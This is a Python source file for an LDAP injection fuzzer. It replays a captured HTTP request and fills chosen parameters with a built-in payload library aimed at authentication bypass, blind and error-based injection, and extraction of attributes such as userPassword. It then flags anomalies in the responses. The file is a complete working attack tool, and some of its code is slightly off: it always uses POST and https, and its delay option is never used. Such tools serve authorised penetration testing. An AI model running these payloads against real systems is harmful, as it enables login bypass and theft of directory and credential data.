#!/usr/bin/env python3
"""
LDAP Injection Fuzzer
Advanced LDAP injection testing tool with HTTP request parsing and multi-parameter fuzzing
"""

import requests
import urllib.parse
import argparse
import re
import time
from typing import Dict, List, Tuple
from collections import defaultdict
import statistics

# Suppress SSL warnings for testing environments
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class LDAPPayloadLibrary:
    """Comprehensive LDAP injection payload collection"""
    
    @staticmethod
    def get_all_payloads() -> Dict[str, List[str]]:
        return {
            "authentication_bypass": [
                "*",
                "*)(",
                "*)(objectClass=*",
                "*)(uid=*)",
                "*)(|(uid=*))",
                "admin)(&",
                "admin*)((|userPassword=*)",
                "*)(cn=*))(|(cn=*",
            ],
            "blind_injection": [
                "*)(objectClass=*))(&(objectClass=void",
                "*)(|(objectClass=*)(objectClass=void))(&(objectClass=*",
                "*)(uid=*))(|(uid=*",
                "*)(&(objectClass=*)(objectClass=void)(&(objectClass=*",
            ],
            "error_based": [
                "*)((|(",
                "*))%00",
                "*()|&'",
                "admin*)(|(password=*))",
                "*)(mail=*))((|cn=*",
            ],
            "attribute_extraction": [
                "*)(uid=*))(|(uid=*",
                "*)(cn=*))(|(cn=*",
                "*)(mail=*))(|(mail=*",
                "*)(sAMAccountName=*))(|(sAMAccountName=*",
                "*)(userPassword=*))(|(userPassword=*",
            ],
            "logic_operators": [
                "*)(!(objectClass=*))",
                "*)(!(&(objectClass=*)))",
                "*)(|(&))",
                "*)(|(uid=admin)(uid=test))",
            ],
            "wildcard_patterns": [
                "admin*",
                "*admin*",
                "a*",
                "adm*",
                "*)(cn=a*",
            ],
            "time_based": [
                "*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*",
                "*)(&(objectClass=*" * 50,
            ],
            "null_byte": [
                "admin\x00",
                "*\x00*",
                "*)\x00(objectClass=*",
            ],
            "encoding_bypass": [
                "%2a",
                "%29%28%7c",
                "\x2a\x29\x28\x7c",
            ],
        }
    
    @staticmethod
    def get_flat_list() -> List[str]:
        """Get all payloads as a flat list"""
        all_payloads = []
        for category, payloads in LDAPPayloadLibrary.get_all_payloads().items():
            all_payloads.extend(payloads)
        return all_payloads


class HTTPRequestParser:
    """Parse raw HTTP requests from files"""
    
    @staticmethod
    def parse_file(filepath: str) -> Tuple[str, Dict, Dict, Dict, str]:
        """
        Parse raw HTTP request file
        Returns: (url, headers, cookies, params, method)
        """
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Split headers and body
        parts = content.split('\n\n', 1)
        header_section = parts[0]
        body = parts[1] if len(parts) > 1 else ""
        
        lines = header_section.split('\n')
        
        # Parse request line
        request_line = lines[0]
        method_match = re.match(r'(\w+)\s+([^\s]+)\s+HTTP', request_line)
        if not method_match:
            raise ValueError("Invalid HTTP request format")
        
        method = method_match.group(1)
        path = method_match.group(2)
        
        # Parse headers
        headers = {}
        cookies = {}
        host = ""
        
        for line in lines[1:]:
            if ':' not in line:
                continue
            
            key, value = line.split(':', 1)
            key = key.strip()
            value = value.strip()
            
            if key.lower() == 'host':
                host = value
            elif key.lower() == 'cookie':
                # Parse cookies
                for cookie in value.split(';'):
                    if '=' in cookie:
                        c_name, c_value = cookie.strip().split('=', 1)
                        cookies[c_name] = c_value
            else:
                headers[key] = value
        
        # Construct full URL
        scheme = "https" if "443" in path or "https" in content else "https"
        url = f"{scheme}://{host}{path.split(';')[0].split('?')[0]}"
        
        # Parse POST parameters
        params = {}
        if body:
            # URL decode the body
            body = body.strip()
            for param in body.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    # URL decode
                    key = urllib.parse.unquote(key)
                    value = urllib.parse.unquote(value)
                    params[key] = value
        
        return url, headers, cookies, params, method


class ResponseAnalyzer:
    """Analyze responses to detect successful injections"""
    
    def __init__(self):
        self.baseline_length = None
        self.baseline_status = None
        self.response_lengths = []
        self.response_times = []
        
    def analyze(self, response, response_time: float, payload: str) -> Dict:
        """
        Analyze response for injection indicators
        Returns dict with detection results
        """
        findings = {
            'payload': payload,
            'status_code': response.status_code,
            'length': len(response.text),
            'time': response_time,
            'anomalies': []
        }
        
        # Set baseline from first response
        if self.baseline_length is None:
            self.baseline_length = len(response.text)
            self.baseline_status = response.status_code
            return findings
        
        # Track lengths and times
        self.response_lengths.append(len(response.text))
        self.response_times.append(response_time)
        
        # Status code change
        if response.status_code != self.baseline_status:
            findings['anomalies'].append(f"Status changed: {self.baseline_status} -> {response.status_code}")
        
        # Significant length change (>10% difference)
        length_diff = abs(len(response.text) - self.baseline_length)
        if length_diff > (self.baseline_length * 0.1):
            findings['anomalies'].append(f"Length diff: {length_diff} bytes ({length_diff/self.baseline_length*100:.1f}%)")
        
        # Error patterns in response
        error_patterns = [
            r'ldap[_\s]*error',
            r'invalid[_\s]*dn',
            r'search[_\s]*failed',
            r'bind[_\s]*failed',
            r'javax\.naming\.NamingException',
            r'LDAPException',
            r'bad[_\s]*search[_\s]*filter',
            r'invalid[_\s]*syntax',
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                findings['anomalies'].append(f"Error pattern detected: {pattern}")
                break
        
        # Time-based detection (if significantly slower)
        if len(self.response_times) > 5:
            avg_time = statistics.mean(self.response_times[:-1])
            if response_time > (avg_time * 2):
                findings['anomalies'].append(f"Timing anomaly: {response_time:.2f}s (avg: {avg_time:.2f}s)")
        
        return findings


class LDAPFuzzer:
    """Main LDAP injection fuzzing engine"""
    
    def __init__(self, url: str, headers: Dict, cookies: Dict, params: Dict, method: str = "POST"):
        self.url = url
        self.headers = headers
        self.cookies = cookies
        self.base_params = params
        self.method = method
        self.analyzer = ResponseAnalyzer()
        
    def get_fuzzable_params(self) -> List[str]:
        """Return list of parameters that can be fuzzed"""
        return list(self.base_params.keys())
    
    def fuzz_parameter(self, param_name: str, payloads: List[str], verbose: bool = False):
        """Fuzz a single parameter with all payloads"""
        print(f"\n{'='*80}")
        print(f"[*] Fuzzing parameter: {param_name}")
        print(f"[*] Testing {len(payloads)} payloads")
        print(f"{'='*80}\n")
        
        interesting_findings = []
        
        for i, payload in enumerate(payloads, 1):
            # Create modified params
            test_params = self.base_params.copy()
            test_params[param_name] = payload
            
            # Make request
            start_time = time.time()
            try:
                response = requests.post(
                    self.url,
                    headers=self.headers,
                    cookies=self.cookies,
                    data=test_params,
                    verify=False,
                    timeout=10
                )
                response_time = time.time() - start_time
                
                # Analyze response
                analysis = self.analyzer.analyze(response, response_time, payload)
                
                # Display results
                status_indicator = "✓" if response.status_code == 200 else "✗"
                print(f"[{i:3d}/{len(payloads)}] {status_indicator} | Status: {analysis['status_code']} | "
                      f"Length: {analysis['length']:6d} | Time: {response_time:5.2f}s | Payload: {payload[:60]}")
                
                # Show anomalies
                if analysis['anomalies']:
                    print(f"         └─> INTERESTING: {', '.join(analysis['anomalies'])}")
                    interesting_findings.append(analysis)
                
                elif verbose:
                    # Show response snippet in verbose mode
                    snippet = response.text[:100].replace('\n', ' ')
                    print(f"         └─> Response: {snippet}...")
                
            except requests.exceptions.Timeout:
                print(f"[{i:3d}/{len(payloads)}] ⏱ | TIMEOUT after 10s | Payload: {payload[:60]}")
                interesting_findings.append({
                    'payload': payload,
                    'anomalies': ['Request timeout - possible time-based injection']
                })
            except Exception as e:
                print(f"[{i:3d}/{len(payloads)}] ✗ | ERROR: {str(e)[:50]} | Payload: {payload[:60]}")
            
            # Rate limiting
            time.sleep(0.1)
        
        # Summary
        print(f"\n{'='*80}")
        print(f"[*] Fuzzing complete for parameter: {param_name}")
        print(f"[*] Interesting findings: {len(interesting_findings)}")
        if interesting_findings:
            print(f"\n[!] SUMMARY OF INTERESTING PAYLOADS:")
            for finding in interesting_findings:
                print(f"    Payload: {finding['payload']}")
                print(f"    Anomalies: {', '.join(finding['anomalies'])}")
                print()
        print(f"{'='*80}\n")


def select_parameters(available_params: List[str]) -> List[str]:
    """Interactive parameter selection"""
    print("\n[*] Available parameters to fuzz:")
    for i, param in enumerate(available_params, 1):
        print(f"    {i}. {param}")
    
    print(f"    {len(available_params) + 1}. ALL PARAMETERS")
    print(f"    0. EXIT")
    
    while True:
        try:
            choice = input("\n[?] Select parameter(s) to fuzz (comma-separated numbers or range): ").strip()
            
            if choice == '0':
                return []
            
            # Handle "all" option
            if str(len(available_params) + 1) in choice:
                return available_params
            
            # Parse selection
            selected = []
            for part in choice.split(','):
                part = part.strip()
                if '-' in part:
                    # Range selection
                    start, end = map(int, part.split('-'))
                    selected.extend(range(start, end + 1))
                else:
                    selected.append(int(part))
            
            # Convert to parameter names
            result = [available_params[i-1] for i in selected if 1 <= i <= len(available_params)]
            return result
            
        except (ValueError, IndexError):
            print("[!] Invalid selection. Try again.")


def main():
    parser = argparse.ArgumentParser(
        description='Advanced LDAP Injection Fuzzer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Fuzz using request file
  python ldap_fuzzer.py -f request.txt
  
  # Fuzz specific parameter with verbose output
  python ldap_fuzzer.py -f request.txt -p login:userName -v
  
  # Use custom payload file
  python ldap_fuzzer.py -f request.txt --payloads custom_payloads.txt
        """
    )
    
    parser.add_argument('-f', '--file', required=True, help='File containing raw HTTP request')
    parser.add_argument('-p', '--param', help='Specific parameter to fuzz (skip interactive selection)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output (show response snippets)')
    parser.add_argument('--payloads', help='File containing custom payloads (one per line)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests (seconds)')
    
    args = parser.parse_args()
    
    # Banner
    print("""
╔══════════════════════════════════════════════════════════════════════════╗
║                         LDAP Injection Fuzzer                            ║
║                     Advanced Security Testing Tool                       ║
╚══════════════════════════════════════════════════════════════════════════╝
    """)
    
    # Parse HTTP request file
    print(f"[*] Parsing request file: {args.file}")
    try:
        url, headers, cookies, params, method = HTTPRequestParser.parse_file(args.file)
        print(f"[+] Target URL: {url}")
        print(f"[+] Method: {method}")
        print(f"[+] Parameters found: {len(params)}")
        print(f"[+] Cookies: {len(cookies)}")
    except Exception as e:
        print(f"[!] Error parsing request file: {e}")
        return
    
    # Load payloads
    if args.payloads:
        print(f"[*] Loading custom payloads from: {args.payloads}")
        with open(args.payloads, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]
    else:
        print(f"[*] Using built-in LDAP injection payload library")
        payloads = LDAPPayloadLibrary.get_flat_list()
    
    print(f"[+] Loaded {len(payloads)} payloads")
    
    # Initialize fuzzer
    fuzzer = LDAPFuzzer(url, headers, cookies, params, method)
    
    # Select parameters to fuzz
    if args.param:
        if args.param not in params:
            print(f"[!] Parameter '{args.param}' not found in request")
            return
        params_to_fuzz = [args.param]
    else:
        params_to_fuzz = select_parameters(fuzzer.get_fuzzable_params())
    
    if not params_to_fuzz:
        print("[*] No parameters selected. Exiting.")
        return
    
    # Start fuzzing
    print(f"\n[*] Starting fuzzing campaign...")
    print(f"[*] Parameters to test: {', '.join(params_to_fuzz)}")
    
    input("\n[?] Press ENTER to start fuzzing...")
    
    for param in params_to_fuzz:
        fuzzer.fuzz_parameter(param, payloads, verbose=args.verbose)
        
        # Reset analyzer for next parameter
        fuzzer.analyzer = ResponseAnalyzer()
    
    print("\n[*] Fuzzing campaign complete!")


if __name__ == "__main__":
    main()
